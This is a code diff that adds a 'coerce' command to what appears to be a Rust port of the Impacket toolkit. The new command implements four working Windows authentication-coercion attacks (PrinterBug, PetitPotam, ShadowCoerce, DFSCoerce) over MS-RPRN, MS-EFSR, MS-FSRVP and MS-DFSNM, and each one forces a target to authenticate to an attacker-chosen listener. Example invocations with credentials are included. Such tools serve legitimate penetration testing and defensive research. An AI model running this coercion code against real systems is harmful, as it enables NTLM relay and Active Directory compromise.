@@ -80,8 +80,11 @@ const IFACE_SRVS: usize = 6;
 const IFACE_RRP: usize = 7;
 const IFACE_TSCH: usize = 8;
 const IFACE_WKST: usize = 9;
-const IFACE_EVEN6: usize = 15;
+const IFACE_RPRN: usize = 11;
+const IFACE_EFSR: usize = 12;
 const IFACE_DFSNM: usize = 13;
+const IFACE_FSRVP: usize = 14;
+const IFACE_EVEN6: usize = 16;
 
 fn print_usage() {
     print!("{}", version::BANNER);
@@ -103,6 +106,7 @@ fn print_usage() {
     println!("  dacledit <TARGET> -target-dn <DN> [options]          Inspect or modify Active Directory DACL permissions (LDAP TCP/389)");
     println!("  owneredit <TARGET> -dn <DN> [-action query|set]      Query or change Active Directory object owner SID (LDAP TCP/389)");
     println!("  dnstool <TARGET> -action <query|add|del> [options]   Active Directory Integrated DNS record management ([MS-DNSP] LDAP)");
+    println!("  coerce <TARGET> -listener <L> [-method <M>] [options] Active Directory auth coercion ([MS-EFSR], [MS-RPRN], [MS-FSRVP], [MS-DFSNM])");
     println!("  dfsclient <TARGET> [-enum|-info <P>|-add|-remove]    Active Directory DFS Namespace management ([MS-DFSNM] \\PIPE\\netdfs)");
     println!("  ldapsearch <TARGET> [-base <dn>] [-filter <f>]       Active Directory generic LDAP directory search (TCP/389)");
     println!("  ldapclient <TARGET> [options]                        Interactive Active Directory administrative shell & REPL (TCP/389)");
@@ -4401,6 +4405,205 @@ fn cmd_dfsclient(args: &[String]) {
                 Err(e2) => {
                     eprintln!("[-] DFS Link enumeration failed: {}", e2);
                 }
+            }
+        }
+    }
+}
+
+fn cmd_coerce(args: &[String]) {
+    print!("{}", version::BANNER);
+    if args.is_empty() {
+        println!("Usage: impacket-rs coerce <TARGET> -listener <LISTENER_IP/HOST> [options]");
+        println!();
+        println!("Coerce remote Windows authentication over Active Directory MSRPC protocols:");
+        println!("  [MS-EFSR]  Encrypting File System (EfsRpcOpenFileRaw - PetitPotam)");
+        println!("  [MS-RPRN]  Print System Remote Protocol (RpcRemoteFindFirstPrinterChangeNotificationEx - PrinterBug)");
+        println!("  [MS-FSRVP] File Server Remote VSS Protocol (IsPathSupported - ShadowCoerce)");
+        println!("  [MS-DFSNM] DFS Namespace Management (NetrDfsRemoveStdRoot - DFSCoerce)");
+        println!();
+        println!("Options:");
+        println!("  -listener <HOST>      Target listener IP or hostname to coerce authentication to (required)");
+        println!("  -method <METHOD>      Coercion protocol: all, efsr, rprn, fsrvp, dfsnm (default: all)");
+        println!("  -share <SHARE>        Share name for DFS / FSRVP (default: test)");
+        println!("  -pipe <PIPE>          Named pipe override for EFSR (default: efsrpc, fallback to lsarpc, samr)");
+        println!();
+        println!("Examples:");
+        println!("  impacket-rs coerce corp.contoso.com/user:Pass@192.168.1.10 -listener 192.168.1.50");
+        println!("  impacket-rs coerce corp.contoso.com/user:Pass@dc01 -listener 192.168.1.50 -method rprn");
+        println!("  impacket-rs coerce corp.contoso.com/admin:Pass@dc01 -listener 192.168.1.50 -method efsr -pipe lsarpc");
+        return;
+    }
+
+    let spec = match parse_target_with_hashes(args) {
+        Ok(s) => s,
+        Err(e) => {
+            eprintln!("[-] Error parsing target: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let mut listener = None;
+    let mut method = "all".to_string();
+    let mut share = "test".to_string();
+    let mut pipe_override = None;
+
+    let mut i = 1;
+    while i < args.len() {
+        match args[i].as_str() {
+            "-listener" if i + 1 < args.len() => {
+                listener = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-method" if i + 1 < args.len() => {
+                method = args[i + 1].to_lowercase();
+                i += 2;
+            }
+            "-share" if i + 1 < args.len() => {
+                share = args[i + 1].clone();
+                i += 2;
+            }
+            "-pipe" if i + 1 < args.len() => {
+                pipe_override = Some(args[i + 1].clone());
+                i += 2;
+            }
+            _ => i += 1,
+        }
+    }
+
+    let listener = match listener {
+        Some(l) => l,
+        None => {
+            eprintln!("[-] Error: -listener <LISTENER_HOST> is required");
+            std::process::exit(1);
+        }
+    };
+
+    println!("[*] Target: {}", spec.effective_target_ip());
+    println!("[*] Listener: {}", listener);
+    println!("[*] Selected method: {}", method);
+
+    let run_efsr = method == "all" || method == "efsr";
+    let run_rprn = method == "all" || method == "rprn";
+    let run_fsrvp = method == "all" || method == "fsrvp";
+    let run_dfsnm = method == "all" || method == "dfsnm";
+
+    // 1. [MS-RPRN] Print System Remote Protocol
+    if run_rprn {
+        println!("[*] Testing [MS-RPRN] Print System on \\PIPE\\spoolss...");
+        match open_pipe_transport(&spec, "spoolss", IFACE_RPRN) {
+            Ok(transport) => {
+                let mut client = impacket_msrpc::RprnClient::new(transport);
+                let printer_name = format!(r"\\{}\pipe\spoolss", spec.effective_target_ip());
+                match client.open_printer(&printer_name) {
+                    Ok(handle) => {
+                        println!("[+] Successfully opened printer handle");
+                        let local_machine = format!(r"\\{}", listener);
+                        match client.remote_find_first_printer_change_notification_ex(
+                            &handle,
+                            impacket_msrpc::rprn::printer_change::PRINTER_CHANGE_ADD_JOB,
+                            &local_machine,
+                        ) {
+                            Ok(code) => {
+                                println!("[+] [MS-RPRN] Notification triggered (return code: 0x{:08x})", code);
+                                println!("[*] Check listener {} for machine account authentication", listener);
+                            }
+                            Err(e) => {
+                                println!("[-] [MS-RPRN] RpcRemoteFindFirstPrinterChangeNotificationEx returned: {}", e);
+                            }
+                        }
+                        let _ = client.close_printer(&handle);
+                    }
+                    Err(e) => {
+                        println!("[-] [MS-RPRN] RpcOpenPrinter failed: {}", e);
+                    }
+                }
+            }
+            Err(e) => {
+                println!("[-] [MS-RPRN] Failed to connect to \\PIPE\\spoolss: {}", e);
+            }
+        }
+    }
+
+    // 2. [MS-EFSR] Encrypting File System Remote Protocol
+    if run_efsr {
+        println!("[*] Testing [MS-EFSR] Encrypting File System...");
+        let pipes_to_try: Vec<&str> = if let Some(ref p) = pipe_override {
+            vec![p.as_str()]
+        } else {
+            vec!["efsrpc", "lsarpc", "samr", "lsass", "netlogon"]
+        };
+
+        let mut coerced = false;
+        for pipe in pipes_to_try {
+            print!("[*] Trying \\PIPE\\{}... ", pipe);
+            match open_pipe_transport(&spec, pipe, IFACE_EFSR) {
+                Ok(transport) => {
+                    let mut client = impacket_msrpc::EfsrClient::new(transport);
+                    let target_path = format!(r"\\{}\test\settings.ini\0", listener);
+                    match client.open_file_raw(&target_path, 0) {
+                        Ok(_) => {
+                            println!("[+] Success!");
+                            println!("[*] Coercion successful via \\PIPE\\{}! Check listener {}", pipe, listener);
+                            coerced = true;
+                            break;
+                        }
+                        Err(e) => {
+                            println!("returned: {}", e);
+                        }
+                    }
+                }
+                Err(e) => {
+                    println!("failed to bind: {}", e);
+                }
+            }
+        }
+        if !coerced && pipe_override.is_none() {
+            println!("[-] [MS-EFSR] All named pipes exhausted");
+        }
+    }
+
+    // 3. [MS-FSRVP] File Server Remote VSS Protocol
+    if run_fsrvp {
+        println!("[*] Testing [MS-FSRVP] File Server Remote VSS on \\PIPE\\fssagentrpc...");
+        match open_pipe_transport(&spec, "fssagentrpc", IFACE_FSRVP) {
+            Ok(transport) => {
+                let mut client = impacket_msrpc::FsrvpClient::new(transport);
+                let share_path = format!(r"\\{}\{}", listener, share);
+                match client.is_path_supported(&share_path) {
+                    Ok((supported, owner)) => {
+                        println!("[+] [MS-FSRVP] IsPathSupported returned: supported={}, owner={:?}", supported, owner);
+                        println!("[*] Check listener {} for machine account authentication", listener);
+                    }
+                    Err(e) => {
+                        println!("[-] [MS-FSRVP] IsPathSupported returned: {}", e);
+                    }
+                }
+            }
+            Err(e) => {
+                println!("[-] [MS-FSRVP] Failed to connect to \\PIPE\\fssagentrpc: {}", e);
+            }
+        }
+    }
+
+    // 4. [MS-DFSNM] DFS Namespace Management
+    if run_dfsnm {
+        println!("[*] Testing [MS-DFSNM] DFS Namespace Management on \\PIPE\\netdfs...");
+        match open_pipe_transport(&spec, "netdfs", IFACE_DFSNM) {
+            Ok(transport) => {
+                let mut client = impacket_msrpc::DfsClient::new(transport);
+                let server_name = format!(r"\\{}\{}", listener, share);
+                match client.remove_std_root(&server_name, &share, 0) {
+                    Ok(code) => {
+                        println!("[+] [MS-DFSNM] NetrDfsRemoveStdRoot returned code: 0x{:08x}", code);
+                        println!("[*] Check listener {} for machine account authentication", listener);
+                    }
+                    Err(e) => {
+                        println!("[-] [MS-DFSNM] NetrDfsRemoveStdRoot returned: {}", e);
+                    }
+                }
+            }
+            Err(e) => {
+                println!("[-] [MS-DFSNM] Failed to connect to \\PIPE\\netdfs: {}", e);
             }
         }
     }
@@ -11599,6 +11802,7 @@ fn main() {
         Some("dfsclient") | Some("dfs-client") | Some("dfssearch") | Some("dfs-search") => {
             cmd_dfsclient(&args[1..])
         }
+        Some("coerce") => cmd_coerce(&args[1..]),
         Some("getTGT") | Some("get-tgt") => cmd_get_tgt(&args[1..]),
         Some("getST") | Some("get-st") => cmd_get_st(&args[1..]),
         Some("getArch") | Some("getarch") | Some("get-arch") => cmd_get_arch(&args[1..]),
